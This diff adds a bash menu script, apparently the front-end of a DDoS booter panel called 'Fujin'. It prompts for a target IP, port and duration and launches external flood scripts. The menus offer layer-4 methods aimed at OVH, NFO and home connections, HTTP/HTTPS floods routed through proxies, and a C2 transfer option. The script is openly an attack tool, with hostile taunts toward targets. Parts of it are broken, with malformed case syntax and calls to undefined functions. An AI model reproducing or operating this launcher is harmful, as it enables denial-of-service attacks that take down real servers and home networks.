@@ -1,0 +1,506 @@
+#!/bin/bash
+BLACK='\e[0;30m'
+CYAN='\e[0;34m'
+CYAN='\e[0;32m'
+CYAN='\e[0;36m'
+RED='\e[0;31m'
+CYAN='\e[0;35m'
+RED='\e[0;33m'
+CYAN='\e[0;37m'
+CYAN='\e[1;30m'
+CYAN='\e[1;34m'
+CYAN='\e[1;32m'
+BLUE='\e[1;36m'
+CYAN='\e[1;31m'
+CYAN='\e[1;35m'
+CYAN='\e[1;33m'
+CYAN='\e[0;37m'
+CYAN='\e[1;37m'
+PINK='\e[1;35m'
+GREEN='\e[1;32m'
+NC='\e[0m'              # No Color
+# Trap Signal Script
+#
+#TitaniumScript.bypass//BASH  Bypass.Function
+#load
+exit_script()
+{
+  echo "* * *Trap * * *"
+  ./m
+}
+
+dstat1()
+{
+    clear
+    echo -e " ${CYAN}
+  ╔═══════════════════════════════════════════════════════════════════════╗
+  ║                        \033[1;91mDSTAT${CYAN}                                          ║
+  ╚═══════════════════════════════════════════════════════════════════════╝
+"
+dstat
+}
+
+admin12()
+{
+    clear
+    echo -e " ${GREEN} "
+	echo "  +-----------------------------------------------------------------------+ "
+    echo "  ���                       EAT MY SHINY ASS                              ��� "
+    echo "  +-----------------------------------------------------------------------+ "                                                         
+echo ":3"
+echo ""
+echo "ENTER BLOODCLOT'S IP :"
+read ip
+echo "PORT :"
+read port
+echo "TIME :"
+read time
+python gott.2.py $ip $port $time
+}
+
+credits(){
+clear
+echo -e " ${CYAN}
+  ╔════════════════════════════════════════════════════════════════════════════╗
+  ║                         \033[1;91mCREDITS${CYAN}                                            ║
+  ╚════════════════════════════════════════════════════════════════════════════╝
+  ╔════════════════════════════════════════════════════════════════════════════╗
+  ║                            Amp: Lead Dev                                   ║
+  ║                            \033[1;91mSnavward${CYAN}: HELPER                                ║
+  ║                            \033[1;91mFallout${CYAN}: EDITOR                                 ║
+  ╚════════════════════════════════════════════════════════════════════════════╝
+"
+}
+
+
+ldap(){
+echo -en "
+╔═════════════════════╗
+║ IP : "
+read ip
+echo -en "
+║ PORT : "
+read port
+echo -en "
+║ TIME : "
+read time
+python3 gott.3.py ${ip} ${port} ${time}
+}
+
+
+privbypass(){
+echo -en "
+╔═════════════════════╗
+║ HOST : "
+read ip
+echo -en "
+║ TIME : "
+read time
+perl gott.5.pl ${ip} ${time}
+}
+
+vector(){
+echo -en "
+╔═════════════════════╗
+║ HOST : "
+read ip
+echo -en "
+║ TIME : "
+read time
+perl gott.12.pl ${ip} ${time}
+}
+
+
+http(){
+echo -en "
+╔═════════════════════╗
+║ URL : "
+read url
+perl gott.6.pl ${url} 1000 50 100
+}
+
+http2(){
+echo -en "
+╔═════════════════════╗
+║ URL : "
+read url
+perl gott.13.pl ${url} 9999 1000 GET 82.137.20.145:8080
+}
+
+http3(){
+echo -en "
+╔═════════════════════╗
+║ URL : "
+read url
+perl gott.13.pl ${url} 9999 1000 GET proxies.txt:8080
+}
+
+speedtest(){
+python speedtest.py
+}
+
+snake(){
+python snake.py
+}
+
+cortex(){
+perl gott.7.c
+}
+cnc(){
+python3 cnc.py
+}
+asy(){
+python3 asylum.py
+}
+
+
+
+_l4()
+{
+clear
+while :
+do
+clear;clear
+echo -en "
+
+\033[1;91m╔══════════════════════════════════╗
+\033[1;91m║${CYAN} [1] OVH                          \033[1;91m║
+\033[1;91m║${CYAN} [2] NFO                          \033[1;91m║
+\033[1;91m║${CYAN} [3] VECTOR                       \033[1;91m║
+\033[1;91m║${CYAN} [4] HOME                         \033[1;91m║
+\033[1;91m║${CYAN} [R] RETURN MAIN MENU             \033[1;91m║
+\033[1;91m╚══════════════════════════════════╝
+${CYAN}[\033[1;91mF u j i n${CYAN}]-家 "
+    read yourch
+    case $yourch in
+      1) _ovh ;;
+      2) _nfo ;;
+      3) _vector ;;
+      4) _home ;;
+	  R) Take_input1 ;;
+      *) echo "INVALID SELECTION," ;
+         echo "PRESS ENTER." ; read ;;
+ esac
+done
+}
+
+trap exit_script 2
+
+
+
+_ovh()
+{
+clear
+while :
+do
+clear;clear
+echo -en "
+
+\033[1;91m╔══════════════════════════════════╗
+\033[1;91m║${CYAN} [1] Ovh-Crush                    \033[1;91m║
+\033[1;91m║${CYAN} [2] Ovh-Amp                      \033[1;91m║
+\033[1;91m║${CYAN} [3] Ovh-Udp                      \033[1;91m║
+\033[1;91m║${CYAN} [4] Qotd                         \033[1;91m║
+\033[1;91m║${CYAN} [5] MAG-7                        \033[1;91m║
+\033[1;91m║${CYAN} [6] k.o                          \033[1;91m║
+\033[1;91m║${CYAN} [7] Ovh-Fly                      \033[1;91m║
+\033[1;91m║${CYAN} [R] RETURN                       \033[1;91m║
+\033[1;91m╚══════════════════════════════════╝
+${CYAN}[\033[1;91mF u j i n${CYAN}]-家 "
+    read yourch
+    case $yourch in
+      1) ldap ;;
+      2) ldap ;;
+	  3) privbypass ;;
+	  4) ldap ;;
+	  5) privbypass ;;
+	  6) ldap ;;
+	  7) ldap ;;
+	  R) _l4 ;;
+      *) echo "INVALID SELECTION," ;
+         echo "PRESS ENTER." ; read ;;
+ esac
+done
+}
+
+trap exit_script 2
+
+
+
+_nfo()
+{
+clear
+while :
+do
+clear;clear
+echo -en "
+
+\033[1;91m╔══════════════════════════════════╗
+\033[1;91m║${CYAN} [1] nfo-rape                     \033[1;91m║
+\033[1;91m║${CYAN} [2] nfo-crush                    \033[1;91m║
+\033[1;91m║${CYAN} [3] redsyn                       \033[1;91m║
+\033[1;91m║${CYAN} [4] bluesyn                      \033[1;91m║
+\033[1;91m║${CYAN} [5] killall                      \033[1;91m║
+\033[1;91m║${CYAN} [6] ak47                         \033[1;91m║
+\033[1;91m║${CYAN} [7] syn-raw                      \033[1;91m║
+\033[1;91m║${CYAN} [R] RETURN                       \033[1;91m║
+\033[1;91m╚══════════════════════════════════╝
+${CYAN}[\033[1;91mF u j i n${CYAN}]-家 "
+    read yourch
+    case $yourch in
+      1) ldap ;;
+      2) ldap ;;
+	  3) privbypass ;;
+	  4) ldap ;;
+	  5) privbypass ;;
+	  6) ldap ;;
+	  7) ldap ;;
+	  R) _l4 ;;
+      *) echo "INVALID SELECTION," ;
+         echo "PRESS ENTER." ; read ;;
+ esac
+done
+}
+
+trap exit_script 2
+
+
+
+
+_vector()
+{
+clear
+while :
+do
+clear;clear
+echo -en "
+
+\033[1;91m╔══════════════════════════════════╗
+\033[1;91m║${CYAN} [1] esp                          \033[1;91m║
+\033[1;91m║${CYAN} [2] vector-esp                   \033[1;91m║
+\033[1;91m║${CYAN} [3] wsx                          \033[1;91m║
+\033[1;91m║${CYAN} [4] cpu-vector                   \033[1;91m║
+\033[1;91m║${CYAN} [5] udp-gain                     \033[1;91m║
+\033[1;91m║${CYAN} [6] tcp-all                      \033[1;91m║
+\033[1;91m║${CYAN} [7] frog                         \033[1;91m║
+\033[1;91m║${CYAN} [R] RETURN                       \033[1;91m║
+\033[1;91m╚══════════════════════════════════╝
+${CYAN}[\033[1;91mF u j i n${CYAN}]-家 "
+    read yourch
+    case $yourch in
+      1) ldap ;;
+      2) ldap ;;
+	  3) privbypass ;;
+	  4) ldap ;;
+	  5) privbypass ;;
+	  6) ldap ;;
+	  7) ldap ;;
+	  R) _l4 ;;
+      *) echo "INVALID SELECTION," ;
+         echo "PRESS ENTER." ; read ;;
+ esac
+done
+}
+
+trap exit_script 2
+
+
+
+_home()
+{
+clear
+while :
+do
+clear;clear
+echo -en "
+
+\033[1;91m╔══════════════════════════════════╗
+\033[1;91m║${CYAN} [1] ldap                         \033[1;91m║
+\033[1;91m║${CYAN} [2] stdhex                       \033[1;91m║
+\033[1;91m║${CYAN} [3] std                          \033[1;91m║
+\033[1;91m║${CYAN} [4] chargen                      \033[1;91m║
+\033[1;91m║${CYAN} [5] udpmix                       \033[1;91m║
+\033[1;91m║${CYAN} [6] stun                         \033[1;91m║
+\033[1;91m║${CYAN} [7] wsd                          \033[1;91m║
+\033[1;91m║${CYAN} [R] RETURN                       \033[1;91m║
+\033[1;91m╚══════════════════════════════════╝
+${CYAN}[\033[1;91mF u j i n${CYAN}]-家 "
+    read yourch
+    case $yourch in
+      1) ldap ;;
+      2) ldap ;;
+	  3) privbypass ;;
+	  4) ldap ;;
+	  5) privbypass ;;
+	  6) ldap ;;
+	  7) ldap ;;
+	  R) _l4 ;;
+      *) echo "INVALID SELECTION," ;
+         echo "PRESS ENTER." ; read ;;
+ esac
+done
+}
+
+trap exit_script 2
+
+
+
+
+
+_tcp()
+{
+clear
+while :
+do
+clear;clear
+echo -en "
+
+\033[1;91m╔══════════════════════════════════╗
+\033[1;91m║${CYAN} [1] PRIVATE BYPASS               \033[1;91m║
+\033[1;91m║${CYAN} [2] OVH METHOD                   \033[1;91m║
+\033[1;91m║${CYAN} [3] TCP FLOOD                    \033[1;91m║
+\033[1;91m║${CYAN} [R] RETURN                       \033[1;91m║
+\033[1;91m╚══════════════════════════════════╝
+${CYAN}[\033[1;91mF u j i n${CYAN}]-家 "
+    read yourch
+    case $yourch in
+	  1) privbypass ;;
+	  2) ovh ;;
+	  3) flood ;;
+	  R) _l4 ;;
+      *) echo "INVALID SELECTION," ;
+         echo "PRESS ENTER." ; read ;;
+ esac
+done
+}
+
+trap exit_script 2
+
+
+
+_l7()
+{
+clear
+while :
+do
+clear;clear
+echo -en "
+
+\033[1;91m╔══════════════════════════════════╗
+\033[1;91m║${CYAN} [1] PROXIE TUT                   \033[1;91m║
+\033[1;91m║${CYAN} [2] HTTP FLOOD 1                 \033[1;91m║
+\033[1;91m║${CYAN} [3] HTTP FLOOD 2                 \033[1;91m║
+\033[1;91m║${CYAN} [4] HTTP FLOOD 3                 \033[1;91m║
+\033[1;91m║${CYAN} [5] HTTPS FLOOD 1                \033[1;91m║
+\033[1;91m║${CYAN} [6] HTTPS FLOOD 2                \033[1;91m║
+\033[1;91m║${CYAN} [R] RETURN MAIN MENU             \033[1;91m║
+\033[1;91m╚══════════════════════════════════╝
+${CYAN}[\033[1;91mF u j i n${CYAN}]-家 "
+    read yourch
+    case $yourch in
+	  1) echo "HTTP METHOD 3: TO GET PROXIES GO TO proxyscrape.com" ;
+	      echo "RENAME FILE TO proxies.txt AND ADD THEM TO THE VPS." ; exit 1 ;;
+	  2) http ;;
+	  3) http2 ;;
+	  4) http3 ;;
+	  5) https ;;
+	  6) https2 ;;
+	  R) Take_input1 ;;
+      *) echo "INVALID SELECTION," ;
+         echo "PRESS ENTER." ; read ;;
+ esac
+done
+}
+
+trap exit_script 2
+
+
+_tools()
+{
+clear
+while :
+do
+clear;clear
+echo -en "
+
+\033[1;91m╔══════════════════════════════════╗
+\033[1;91m║${CYAN} [1] cnc crasher                  \033[1;91m║
+\033[1;91m║${CYAN} [2] asylum terminal              \033[1;91m║
+\033[1;91m║${CYAN} [R] RETURN MAIN MENU             \033[1;91m║
+\033[1;91m╚══════════════════════════════════╝
+${CYAN}[\033[1;91mF u j i n${CYAN}]-家 "
+    read yourch
+    case $yourch in
+      1) _cnc ;;
+      2) _asy ;;
+	  R) Take_input1 ;;
+      *) echo "INVALID SELECTION," ;
+         echo "PRESS ENTER." ; read ;;
+ esac
+done
+}
+
+trap exit_script 2
+
+
+
+exit_script1()
+{
+  exit 1
+}
+
+Take_input1()
+{
+clear
+while :
+do
+clear;clear
+echo -en "
+███████╗██╗   ██╗     ██╗██╗███╗   ██╗
+██╔════╝██║   ██║     ██║██║████╗  ██║
+█████╗  ██║   ██║     ██║██║██╔██╗ ██║
+██╔══╝  ██║   ██║██   ██║██║██║╚██╗██║ ⿆⾐
+██║     ╚██████╔╝╚█████╔╝██║██║ ╚████║
+╚═╝      ╚═════╝  ╚════╝ ╚═╝╚═╝  ╚═══╝
+              \033[1;91m罪 深 い Made By Ampx\033[00m
+
+\033[1;91m╔══════════════════════════════════╗
+\033[1;91m║${CYAN} [1] L4                           \033[1;91m║
+\033[1;91m║${CYAN} [2] l7                           \033[1;91m║
+\033[1;91m║${CYAN} [3] Tools                        \033[1;91m║
+\033[1;91m║${CYAN} [4] Transfer to Remark C2        \033[1;91m║
+\033[1;91m║${CYAN} [C] CREDITS.                     \033[1;91m║
+\033[1;91m║${CYAN} [I] INFO.                        \033[1;91m║
+\033[1;91m║${CYAN} [X] CLOSE.                       \033[1;91m║
+\033[1;91m╚══════════════════════════════════╝
+${CYAN}[\033[1;91mF u j i n${CYAN}]-家 "
+    read yourch
+    case $yourch in
+	  1) _l4 ;;
+	  2) _l7 ;;
+    3) _tools
+	  4) cortex ; exit 1 ;;
+	  5) snake ;;
+	  6) speedtest ;;
+	  7) vnstat -l -i eth0 ;;
+	  8) dstat1 ;;
+	  9) users ;;
+	  10) last ; exit 1 ;;
+	  C) credits ; exit 1 ;;
+	  I) echo "cnc" ;;
+	  X) exit 1  ;;
+      *) echo "INVALID SELECTION," ;
+         echo "PRESS ENTER." ; read ;;
+ esac
+done # end_while
+}
+#
+# Set trap to for CTRL+C interrupt i.e. Install our error handler
+# When occurs it first it calls del_file() and then exit
+#
+trap exit_script 2
+#
+# Call our user define function : Take_inpt1
+#
+
+Take_input1
